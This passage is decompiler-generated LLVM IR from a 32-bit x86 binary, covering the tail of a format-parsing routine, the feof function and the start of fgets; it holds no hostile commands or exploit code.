  br i1 %v1_805267b, label %dec_label_pc_80526c9, label %dec_label_pc_805267d

dec_label_pc_805267d:                             ; preds = %dec_label_pc_8052679
  %v1_805267f = add i32 %v0_80526c9, -134587029
  store i32 %v1_805267f, i32* %edx.global-to-local, align 4
  %v7_8052688 = icmp sgt i32 %v1_805267f, 17
  br i1 %v7_8052688, label %dec_label_pc_805268a, label %dec_label_pc_8052693

dec_label_pc_805268a:                             ; preds = %dec_label_pc_805267d
  %v1_805268a = add i32 %v0_80526c9, -134587031
  store i32 %v1_805268a, i32* %eax.global-to-local, align 4
  %v3_805268d = and i32 %v2_8052665, 1024
  %v4_805268d = icmp eq i32 %v3_805268d, 0
  %v1_8052690 = icmp eq i1 %v4_805268d, false
  %v4_8052690 = select i1 %v1_8052690, i32 %v1_805268a, i32 %v1_805267f
  store i32 %v4_8052690, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052693

dec_label_pc_8052693:                             ; preds = %dec_label_pc_805267d, %dec_label_pc_805268a
  %v0_805269c = phi i32 [ %v1_805267f, %dec_label_pc_805267d ], [ %v4_8052690, %dec_label_pc_805268a ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a28b.487 to i32), i32* %ecx.global-to-local, align 4
  %v2_805269c = add i32 %tmp76, 32
  %v3_805269c = inttoptr i32 %v2_805269c to i32*
  store i32 %v0_805269c, i32* %v3_805269c, align 4
  %v0_805269f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80526a3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805269f

dec_label_pc_805269f:                             ; preds = %dec_label_pc_805269f, %dec_label_pc_8052693
  %v0_805269f = phi i32 [ %v1_805269f, %dec_label_pc_805269f ], [ %v0_805269f.pre, %dec_label_pc_8052693 ]
  %v1_805269f = add i32 %v0_805269f, 1
  store i32 %v1_805269f, i32* %ecx.global-to-local, align 4
  %v1_80526a0 = inttoptr i32 %v1_805269f to i8*
  %v2_80526a0 = load i8, i8* %v1_80526a0, align 1
  %v3_80526a0 = sext i8 %v2_80526a0 to i32
  store i32 %v3_80526a0, i32* %eax.global-to-local, align 4
  %v8_80526a5 = icmp sgt i32 %v0_80526a3.pre, %v3_80526a0
  br i1 %v8_80526a5, label %dec_label_pc_805269f, label %dec_label_pc_80526a7

dec_label_pc_80526a7:                             ; preds = %dec_label_pc_805269f
  store i32 ptrtoint ([21 x i8]* @global_var_805a295.486 to i32), i32* @ecx, align 4
  %v1_80526ae = add i32 %v0_805269f, -134587019
  store i32 %v1_80526ae, i32* %eax.global-to-local, align 4
  %v2_80526b3 = add i32 %v0_805269f, add (i32 ptrtoint (i32* @global_var_805a27c.488 to i32), i32 -134587019)
  %v3_80526b3 = add i32 %v2_80526b3, %v1_80526ae
  %v4_80526b3 = inttoptr i32 %v3_80526b3 to i16*
  %v5_80526b3 = load i16, i16* %v4_80526b3, align 2
  %v6_80526b3 = sext i16 %v5_80526b3 to i32
  store i32 %v6_80526b3, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_80526ae, 2
  %v3_80526bb = add i32 %factor, 134586988
  %v4_80526bb = inttoptr i32 %v3_80526bb to i16*
  %v5_80526bb = load i16, i16* %v4_80526bb, align 2
  %v6_80526bb = sext i16 %v5_80526bb to i32
  store i32 %v6_80526bb, i32* %eax.global-to-local, align 4
  %v1_80526c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526c3 = or i32 %v1_80526c3, %v6_80526b3
  %v2_80526c5 = and i32 %v2_80526c3, %v6_80526bb
  store i32 %v2_80526c5, i32* %edx.global-to-local, align 4
  %v0_80526d7.pre = load i32, i32* @esi, align 4
  %v0_80526da.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80526cf

dec_label_pc_80526c9:                             ; preds = %dec_label_pc_8052679
  %v1_80526c9 = add i32 %v0_80526c9, 1
  store i32 %v1_80526c9, i32* @ecx, align 4
  %v1_80526ca = inttoptr i32 %v1_80526c9 to i8*
  %v2_80526ca = load i8, i8* %v1_80526ca, align 1
  %v3_80526ca = icmp eq i8 %v2_80526ca, 0
  %v1_80526cd = icmp eq i1 %v3_80526ca, false
  br i1 %v1_80526cd, label %dec_label_pc_8052679, label %dec_label_pc_80526cf

dec_label_pc_80526cf:                             ; preds = %dec_label_pc_80526c9, %dec_label_pc_80526a7
  %v0_80526da = phi i32 [ %v0_80526da.pre, %dec_label_pc_80526a7 ], [ %storemerge4, %dec_label_pc_80526c9 ]
  %v0_80526d7 = phi i32 [ %v0_80526d7.pre, %dec_label_pc_80526a7 ], [ %v0_8052663, %dec_label_pc_80526c9 ]
  %v0_80526cf = phi i32 [ %v2_80526c5, %dec_label_pc_80526a7 ], [ %v3_8052670, %dec_label_pc_80526c9 ]
  store i32 %v0_80526cf, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80526d7 = inttoptr i32 %v0_80526d7 to i8*
  %v2_80526d7 = load i8, i8* %v1_80526d7, align 1
  %v3_80526d7 = sext i8 %v2_80526d7 to i32
  store i32 %v3_80526d7, i32* %eax.global-to-local, align 4
  %v2_80526da = add i32 %tmp76, 4
  %v3_80526da = inttoptr i32 %v2_80526da to i32*
  store i32 %v0_80526da, i32* %v3_80526da, align 4
  %v0_80526dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80526dd = load i32, i32* @edx, align 4
  %v2_80526dd = add i32 %v1_80526dd, 12
  %v3_80526dd = inttoptr i32 %v2_80526dd to i32*
  store i32 %v0_80526dd, i32* %v3_80526dd, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80526e4 = load i32, i32* @edx, align 4
  %v1_80526e4 = add i32 %v0_80526e4, 28
  %v2_80526e4 = inttoptr i32 %v1_80526e4 to i32*
  store i32 1, i32* %v2_80526e4, align 4
  %v0_80526eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80526eb = load i32, i32* @edx, align 4
  %v2_80526eb = add i32 %v1_80526eb, 8
  %v3_80526eb = inttoptr i32 %v2_80526eb to i32*
  store i32 %v0_80526eb, i32* %v3_80526eb, align 4
  %v0_80526ee = load i32, i32* %edi.global-to-local, align 4
  %v1_80526f8 = and i32 %v0_80526ee, -5
  %v0_80526fe = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526fe = and i32 %v0_80526fe, 3840
  store i32 %v1_80526fe, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8052707 = or i32 %v1_80526fe, %v1_80526f8
  store i32 %v2_8052707, i32* @edi, align 4
  %v1_8052709 = load i32, i32* @edx, align 4
  %v2_8052709 = add i32 %v1_8052709, 20
  %v3_8052709 = inttoptr i32 %v2_8052709 to i32*
  store i32 48, i32* %v3_8052709, align 4
  %v0_805270c = load i32, i32* @edi, align 4
  %v1_805270c = load i32, i32* @edx, align 4
  %v2_805270c = add i32 %v1_805270c, 16
  %v3_805270c = inttoptr i32 %v2_805270c to i32*
  store i32 %v0_805270c, i32* %v3_805270c, align 4
  %v0_805270f = load i32, i32* @ecx, align 4
  %v1_805270f = inttoptr i32 %v0_805270f to i8*
  %v2_805270f = load i8, i8* %v1_805270f, align 1
  %v3_805270f = icmp eq i8 %v2_805270f, 0
  %v1_8052712 = icmp eq i1 %v3_805270f, false
  br i1 %v1_8052712, label %dec_label_pc_805272b, label %dec_label_pc_8052714

dec_label_pc_8052714:                             ; preds = %dec_label_pc_80526cf
  %v0_8052714 = load i32, i32* @esi, align 4
  %v1_8052714 = inttoptr i32 %v0_8052714 to i8*
  %v2_8052714 = load i8, i8* %v1_8052714, align 1
  %v11_8052714 = icmp eq i8 %v2_8052714, 109
  %v1_8052717 = icmp eq i1 %v11_8052714, false
  br i1 %v1_8052717, label %dec_label_pc_8052825, label %dec_label_pc_805271d

dec_label_pc_805271d:                             ; preds = %dec_label_pc_8052714
  %v0_805271d = load i32, i32* @edx, align 4
  %v1_805271d = add i32 %v0_805271d, 32
  %v2_805271d = inttoptr i32 %v1_805271d to i32*
  store i32 20, i32* %v2_805271d, align 4
  %v0_8052724 = load i32, i32* @edx, align 4
  %v1_8052724 = add i32 %v0_8052724, 28
  %v2_8052724 = inttoptr i32 %v1_8052724 to i32*
  store i32 0, i32* %v2_8052724, align 4
  br label %dec_label_pc_805272b

dec_label_pc_805272b:                             ; preds = %dec_label_pc_80526cf, %dec_label_pc_805271d
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_80527c7, label %dec_label_pc_8052736

dec_label_pc_8052736:                             ; preds = %dec_label_pc_805272b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_80527af = add i32 %tmp76, 40
  %v4_8052745 = add i32 %tmp76, 36
  %v1_80527b8 = add i32 %tmp76, 28
  %v2_80527b8 = inttoptr i32 %v1_80527b8 to i32*
  br label %dec_label_pc_8052738

dec_label_pc_8052738:                             ; preds = %dec_label_pc_80527b3, %dec_label_pc_8052736
  %v0_805274e = phi i32 [ 0, %dec_label_pc_8052736 ], [ %v1_80527b7, %dec_label_pc_80527b3 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8052736 ], [ %stack_var_-88.5, %dec_label_pc_80527b3 ]
  %v1_8052738 = add i32 %v0_805274e, -2
  %v6_8052738 = sub i32 1, %v0_805274e
  %v7_8052738 = and i32 %v6_8052738, %v0_805274e
  %v8_8052738 = icmp slt i32 %v7_8052738, 0
  %v9_8052738 = icmp eq i32 %v1_8052738, 0
  %v10_8052738 = icmp slt i32 %v1_8052738, 0
  %v3_805273b = icmp eq i1 %v10_8052738, %v8_8052738
  %v4_805273b = icmp eq i1 %v9_8052738, false
  %v5_805273b = and i1 %v4_805273b, %v3_805273b
  br i1 %v5_805273b, label %dec_label_pc_805274e, label %dec_label_pc_805273d

dec_label_pc_805273d:                             ; preds = %dec_label_pc_8052738
  %v0_805273d = load i32, i32* @esp, align 4
  %v2_805273d = mul i32 %v0_805274e, 4
  %v3_805273d = add i32 %v2_805273d, 68
  %v4_805273d = add i32 %v3_805273d, %v0_805273d
  %v5_805273d = inttoptr i32 %v4_805273d to i32*
  %v6_805273d = load i32, i32* %v5_805273d, align 4
  store i32 %v6_805273d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8052745 = trunc i32 %v6_805273d to i8
  %v5_8052745 = add i32 %v4_8052745, %v0_805274e
  %v6_8052745 = inttoptr i32 %v5_8052745 to i8*
  store i8 %v1_8052745, i8* %v6_8052745, align 1
  %v0_8052749 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052749 = urem i32 %v0_8052749, 256
  br label %dec_label_pc_8052757

dec_label_pc_805274e:                             ; preds = %dec_label_pc_8052738
  %v5_8052750 = add i32 %v0_805274e, %stack_var_-32.3
  store i32 %v5_8052750, i32* %eax.global-to-local, align 4
  %v1_8052754 = add i32 %v5_8052750, -2
  br label %dec_label_pc_8052757

dec_label_pc_8052757:                             ; preds = %dec_label_pc_805273d, %dec_label_pc_805274e
  %v0_805276a = phi i32 [ %v1_8052749, %dec_label_pc_805273d ], [ %v1_8052754, %dec_label_pc_805274e ]
  store i32 %v0_805276a, i32* %eax.global-to-local, align 4
  %v5_8052757 = sub i32 %v0_805276a, %stack_var_-88.4
  %v11_8052757 = xor i32 %v0_805276a, %stack_var_-88.4
  %v12_8052757 = xor i32 %v5_8052757, %v0_805276a
  %v13_8052757 = and i32 %v12_8052757, %v11_8052757
  %v14_8052757 = icmp slt i32 %v13_8052757, 0
  %v15_8052757 = icmp eq i32 %v5_8052757, 0
  %v16_8052757 = icmp slt i32 %v5_8052757, 0
  %v3_805275b = icmp ne i1 %v16_8052757, %v14_8052757
  %v4_805275b = or i1 %v15_8052757, %v3_805275b
  br i1 %v4_805275b, label %dec_label_pc_805276a, label %dec_label_pc_805275d

dec_label_pc_805275d:                             ; preds = %dec_label_pc_8052757
  %v1_805275d = add i32 %v0_805276a, -9
  %v6_805275d = sub i32 8, %v0_805276a
  %v7_805275d = and i32 %v6_805275d, %v0_805276a
  %v8_805275d = icmp slt i32 %v7_805275d, 0
  %v9_805275d = icmp eq i32 %v1_805275d, 0
  %v10_805275d = icmp slt i32 %v1_805275d, 0
  %v3_8052760 = icmp eq i1 %v10_805275d, %v8_805275d
  %v4_8052760 = icmp eq i1 %v9_805275d, false
  %v5_8052760 = and i1 %v4_8052760, %v3_8052760
  br i1 %v5_8052760, label %dec_label_pc_8052825, label %dec_label_pc_805276a

dec_label_pc_805276a:                             ; preds = %dec_label_pc_805275d, %dec_label_pc_8052757
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_8052757 ], [ %v0_805276a, %dec_label_pc_805275d ]
  %v1_805276a = add i32 %v0_805276a, -1
  store i32 %v1_805276a, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8052773 = load i32, i32* @esp, align 4
  %v1_8052773 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052773 = mul i32 %v1_8052773, 4
  %v3_8052773 = add i32 %v0_8052773, 80
  %v4_8052773 = add i32 %v3_8052773, %v2_8052773
  %v5_8052773 = inttoptr i32 %v4_8052773 to i32*
  %v6_8052773 = load i32, i32* %v5_8052773, align 4
  store i32 %v6_8052773, i32* %edi.global-to-local, align 4
  %v2_8052777 = mul i32 %v1_805276a, 4
  %v4_8052777 = add i32 %v4_80527af, %v2_8052777
  %v5_8052777 = inttoptr i32 %v4_8052777 to i32*
  %v6_8052777 = load i32, i32* %v5_8052777, align 4
  store i32 %v6_8052777, i32* @eax, align 4
  %v9_805277b = icmp eq i32 %v6_8052773, 8
  br i1 %v9_805277b, label %dec_label_pc_80527b3, label %dec_label_pc_8052780

dec_label_pc_8052780:                             ; preds = %dec_label_pc_805276a
  %v9_8052780 = icmp eq i32 %v6_8052777, 8
  br i1 %v9_8052780, label %dec_label_pc_80527a3, label %dec_label_pc_8052785

dec_label_pc_8052785:                             ; preds = %dec_label_pc_8052780
  %v12_8052785 = icmp eq i32 %v6_8052777, %v6_8052773
  br i1 %v12_8052785, label %dec_label_pc_80527a3, label %dec_label_pc_8052789

dec_label_pc_8052789:                             ; preds = %dec_label_pc_8052785
  %v1_8052789 = call i32 @_promoted_size(i32 %v1_805276a)
  store i32 %v1_8052789, i32* %ebx.global-to-local, align 4
  %v0_8052790 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8052790, i32* @eax, align 4
  %v1_8052792 = call i32 @_promoted_size(i32 %v1_805276a)
  %v2_8052797 = sub i32 %v1_8052789, %v1_8052792
  %v8_8052797 = xor i32 %v1_8052789, %v1_8052792
  %v9_8052797 = xor i32 %v2_8052797, %v1_8052789
  %v10_8052797 = and i32 %v9_8052797, %v8_8052797
  %v11_8052797 = icmp slt i32 %v10_8052797, 0
  %v12_8052797 = icmp eq i32 %v2_8052797, 0
  %v13_8052797 = icmp slt i32 %v2_8052797, 0
  %v3_8052799 = icmp ne i1 %v13_8052797, %v11_8052797
  %v4_8052799 = or i1 %v12_8052797, %v3_8052799
  %v5_8052799 = zext i1 %v4_8052799 to i32
  store i32 %v5_8052799, i32* %eax.global-to-local, align 4
  %v1_805279f = icmp eq i1 %v4_8052799, false
  br i1 %v1_805279f, label %dec_label_pc_80527b3, label %dec_label_pc_8052789.dec_label_pc_80527a3_crit_edge

dec_label_pc_8052789.dec_label_pc_80527a3_crit_edge: ; preds = %dec_label_pc_8052789
  %v0_80527a3.pre = load i32, i32* @esp, align 4
  %v1_80527a3.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80527a3

dec_label_pc_80527a3:                             ; preds = %dec_label_pc_8052789.dec_label_pc_80527a3_crit_edge, %dec_label_pc_8052785, %dec_label_pc_8052780
  %v1_80527a3 = phi i32 [ %v1_80527a3.pre, %dec_label_pc_8052789.dec_label_pc_80527a3_crit_edge ], [ %v1_8052773, %dec_label_pc_8052785 ], [ %v1_8052773, %dec_label_pc_8052780 ]
  %v0_80527a3 = phi i32 [ %v0_80527a3.pre, %dec_label_pc_8052789.dec_label_pc_80527a3_crit_edge ], [ %v0_8052773, %dec_label_pc_8052785 ], [ %v0_8052773, %dec_label_pc_8052780 ]
  %v2_80527a3 = mul i32 %v1_80527a3, 4
  %v3_80527a3 = add i32 %v0_80527a3, 80
  %v4_80527a3 = add i32 %v3_80527a3, %v2_80527a3
  %v5_80527a3 = inttoptr i32 %v4_80527a3 to i32*
  %v6_80527a3 = load i32, i32* %v5_80527a3, align 4
  store i32 %v6_80527a3, i32* %eax.global-to-local, align 4
  store i32 %v1_805276a, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_80527a3, i32* %v5_8052777, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_80527b3:                             ; preds = %dec_label_pc_8052789, %dec_label_pc_805276a, %dec_label_pc_80527a3
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80527b7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80527b7 = add i32 %v0_80527b7, 1
  store i32 %v1_80527b7, i32* %ebp.global-to-local, align 4
  %v3_80527b8 = load i32, i32* %v2_80527b8, align 4
  %v1_80527bb = add i32 %v3_80527b8, 2
  store i32 %v1_80527bb, i32* %eax.global-to-local, align 4
  %v5_80527c0 = icmp slt i32 %v1_80527b7, %v1_80527bb
  br i1 %v5_80527c0, label %dec_label_pc_8052738, label %dec_label_pc_80527ee

dec_label_pc_80527c7:                             ; preds = %dec_label_pc_805272b
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80527cb = add i32 %tmp76, 38
  %v2_80527cb = inttoptr i32 %v1_80527cb to i8*
  store i8 1, i8* %v2_80527cb, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80527d4 = add i32 %tmp76, 28
  %v2_80527d4 = inttoptr i32 %v1_80527d4 to i32*
  %v3_80527d4 = load i32, i32* %v2_80527d4, align 4
  %v2_80527d7 = mul i32 %v3_80527d4, 4
  %v2_80527db = ptrtoint i32* %stack_var_-20 to i32
  %v1_80527e2 = add i32 %tmp76, 40
  store i32 %v1_80527e2, i32* %eax.global-to-local, align 4
  %v3_80527e6 = inttoptr i32 %v1_80527e2 to i16*
  %v4_80527e6 = call i32 @memcpy(i16* %v3_80527e6, i32 %v2_80527db, i32 %v2_80527d7)
  store i32 %v4_80527e6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527ee

dec_label_pc_80527ee:                             ; preds = %dec_label_pc_80527b3, %dec_label_pc_80527c7
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80527c7 ], [ %stack_var_-88.5, %dec_label_pc_80527b3 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_80527f6 = inttoptr i32 %v1_8052497 to i8*
  %v3_80527f6 = load i8, i8* %v2_80527f6, align 1
  %v5_80527f6 = icmp slt i8 %v3_80527f6, 0
  store i32 %stack_var_-88.6, i32* %v2_8052490, align 4
  br i1 %v5_80527f6, label %dec_label_pc_8052806, label %dec_label_pc_80527ff

dec_label_pc_80527ff:                             ; preds = %dec_label_pc_80527ee
  %v0_80527ff = load i32, i32* @esi, align 4
  %v1_80527ff = add i32 %v0_80527ff, 1
  store i32 %v1_80527ff, i32* %eax.global-to-local, align 4
  %v1_8052802 = load i32, i32* @ecx, align 4
  %v2_8052802 = inttoptr i32 %v1_8052802 to i32*
  store i32 %v1_80527ff, i32* %v2_8052802, align 4
  br label %dec_label_pc_8052819

dec_label_pc_8052806:                             ; preds = %dec_label_pc_80527ee
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_8052464, i32* %edx.global-to-local, align 4
  %v0_805280e = load i32, i32* @esi, align 4
  %v2_805280e = sub i32 %v0_805280e, %v4_8052464
  store i32 %v2_805280e, i32* %esi.global-to-local, align 4
  %v1_8052810 = mul i32 %v2_805280e, 4
  %v2_8052810 = add i32 %v1_8052810, 224
  store i32 %v2_8052810, i32* %eax.global-to-local, align 4
  %v2_8052817 = load i32, i32* %arg1, align 4
  %v4_8052817 = add i32 %v2_8052817, %v2_8052810
  store i32 %v4_8052817, i32* %arg1, align 4
  br label %dec_label_pc_8052819

dec_label_pc_8052819:                             ; preds = %dec_label_pc_80527ff, %dec_label_pc_8052806
  store i32 %tmp76, i32* @edx, align 4
  %v1_805281d = add i32 %tmp76, 28
  %v2_805281d = inttoptr i32 %v1_805281d to i32*
  %v3_805281d = load i32, i32* %v2_805281d, align 4
  store i32 %v3_805281d, i32* %eax.global-to-local, align 4
  %v1_8052820 = add i32 %v3_805281d, 2
  br label %dec_label_pc_8052828

dec_label_pc_8052825:                             ; preds = %dec_label_pc_80524b5, %dec_label_pc_805254f, %dec_label_pc_8052582, %dec_label_pc_80525fd, %dec_label_pc_80525e9, %dec_label_pc_80525e0, %dec_label_pc_805275d, %dec_label_pc_8052714, %dec_label_pc_805265f
  br label %dec_label_pc_8052828

dec_label_pc_8052828:                             ; preds = %dec_label_pc_8052819, %dec_label_pc_8052825
  %storemerge6 = phi i32 [ %v1_8052820, %dec_label_pc_8052819 ], [ -1, %dec_label_pc_8052825 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805282b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805282b, i32* @ebx, align 4
  store i32 %v0_8052463, i32* @esi, align 4
  store i32 %v0_8052462, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_80527b7, { 0, 2, 1 }
  uselistorder i32 %v2_8052797, { 1, 2, 0 }
  uselistorder i32 %v1_8052789, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805276a, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805275d, { 1, 0 }
  uselistorder i32 %v5_8052757, { 1, 2, 0 }
  uselistorder i32 %v0_805276a, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8052738, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805274e, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_80526c9, { 1, 2, 0 }
  uselistorder i32 %v1_805269f, { 1, 2, 0 }
  uselistorder i32 %v0_80526c9, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052665, { 1, 0 }
  uselistorder i32 %v1_8052652, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805265b, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8052645, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805263b, { 1, 0 }
  uselistorder i32 %v1_805261d, { 1, 0 }
  uselistorder i32 %v0_805263b.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8052600, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_80525f7, { 1, 2, 0 }
  uselistorder i32 %v0_80525bd, { 1, 0 }
  uselistorder i32 %v1_80525af, { 1, 0 }
  uselistorder i32 %v1_80525aa, { 0, 1, 3, 2 }
  uselistorder i32 %v6_80525a8, { 2, 0, 1 }
  uselistorder i32 %v0_80525ca, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052565, { 1, 2, 0 }
  uselistorder i32 %v0_805253d, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_8052533, { 1, 2, 0 }
  uselistorder i32 %v6_8052531, { 0, 2, 1 }
  uselistorder i32 %v0_8052530, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8052529, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8052529, { 2, 1, 0 }
  uselistorder i32 %v1_8052521, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_8052507, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80524dd, { 0, 2, 1 }
  uselistorder i32 %v0_80524ca, { 2, 0, 1 }
  uselistorder i32 %v4_8052464, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134587019, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805a295.486 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052828, { 1, 0 }
  uselistorder label %dec_label_pc_8052825, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052819, { 1, 0 }
  uselistorder label %dec_label_pc_80527ee, { 1, 0 }
  uselistorder label %dec_label_pc_80527b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052757, { 1, 0 }
  uselistorder label %dec_label_pc_805272b, { 1, 0 }
  uselistorder label %dec_label_pc_8052693, { 1, 0 }
  uselistorder label %dec_label_pc_805265f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052636, { 1, 0 }
  uselistorder label %dec_label_pc_805260d, { 1, 0 }
  uselistorder label %dec_label_pc_80525d4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052577, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052531, { 1, 0 }
  uselistorder label %dec_label_pc_8052530, { 1, 0 }
  uselistorder label %dec_label_pc_8052517, { 1, 0 }
  uselistorder label %dec_label_pc_8052500, { 1, 0 }
  uselistorder label %dec_label_pc_8052500.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_8052833 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052836 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052836, i32* %esi.global-to-local, align 4
  %v1_805283a = add i32 %v4_8052836, 52
  %v2_805283a = inttoptr i32 %v1_805283a to i32*
  %v3_805283a = load i32, i32* %v2_805283a, align 4
  %v1_805283d = icmp eq i32 %v3_805283a, 0
  %v1_805283f = icmp eq i1 %v1_805283d, false
  br i1 %v1_805283f, label %dec_label_pc_8052860, label %dec_label_pc_8052841

dec_label_pc_8052841:                             ; preds = %entry
  %v1_8052841 = add i32 %v4_8052836, 56
  store i32 %v1_8052841, i32* %ebx.global-to-local, align 4
  store i32 %v12_8052833, i32* @eax, align 4
  %v2_8052850 = call i32 @__pthread_return_void(i32 %v12_8052833, i32 134566343)
  %v1_8052858 = call i32 @__pthread_return_0(i32 %v1_8052841)
  %v0_8052862.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052860

dec_label_pc_8052860:                             ; preds = %entry, %dec_label_pc_8052841
  %v0_8052862 = phi i32 [ %v4_8052836, %entry ], [ %v0_8052862.pre, %dec_label_pc_8052841 ]
  %v1_8052862 = inttoptr i32 %v0_8052862 to i16*
  %v2_8052862 = load i16, i16* %v1_8052862, align 2
  %v3_8052862 = zext i16 %v2_8052862 to i32
  store i32 %v3_8052862, i32* %ebx.global-to-local, align 4
  br i1 %v1_805283f, label %dec_label_pc_8052878, label %dec_label_pc_8052867

dec_label_pc_8052867:                             ; preds = %dec_label_pc_8052860
  store i32 %v12_8052833, i32* @eax, align 4
  %v2_8052870 = call i32 @__pthread_return_void(i32 %v12_8052833, i32 1)
  %v0_805287b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052878

dec_label_pc_8052878:                             ; preds = %dec_label_pc_8052860, %dec_label_pc_8052867
  %v0_805287b = phi i32 [ %v3_8052862, %dec_label_pc_8052860 ], [ %v0_805287b.pre, %dec_label_pc_8052867 ]
  %v1_805287b = and i32 %v0_805287b, 4
  ret i32 %v1_805287b

; uselistorder directives
  uselistorder i32 %v12_8052833, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052878, { 1, 0 }
  uselistorder label %dec_label_pc_8052860, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052884 = load i32, i32* @edi, align 4
  %v0_8052885 = load i32, i32* @esi, align 4
  %v0_8052886 = load i32, i32* @ebx, align 4
  %v12_8052887 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_805288e = add i32 %arg3, 52
